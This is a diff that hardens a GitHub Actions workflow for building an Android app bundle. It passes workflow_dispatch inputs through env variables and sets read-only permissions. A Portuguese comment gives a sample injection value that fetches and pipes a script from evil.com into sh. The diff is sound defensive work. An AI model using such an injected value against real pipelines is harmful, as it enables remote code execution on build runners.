@@ -22,6 +22,9 @@ on:
         required: false
         default: '1'
 
+permissions:
+  contents: read
+
 jobs:
   build:
     name: 📱 Build AAB · Play Store
@@ -44,9 +47,14 @@ jobs:
 
       - name: Configurar versão do app
         if: github.event.inputs.version_name != ''
+        env:
+          # Passar por env: (não interpolar direto no run:) evita que um input
+          # malicioso de workflow_dispatch (ex: `x"; curl evil.com | sh #`)
+          # seja splicado no texto do script antes do shell processar — o
+          # shell só vê o VALOR da variável, nunca o texto bruto do input.
+          VERSION_NAME: ${{ github.event.inputs.version_name }}
+          VERSION_CODE: ${{ github.event.inputs.version_code }}
         run: |
-          VERSION_NAME="${{ github.event.inputs.version_name }}"
-          VERSION_CODE="${{ github.event.inputs.version_code }}"
           sed -i "s/versionName \".*\"/versionName \"$VERSION_NAME\"/" nancy-twa/app/build.gradle
           sed -i "s/versionCode [0-9]*/versionCode $VERSION_CODE/" nancy-twa/app/build.gradle
           echo "✅ Versão: $VERSION_NAME ($VERSION_CODE)"
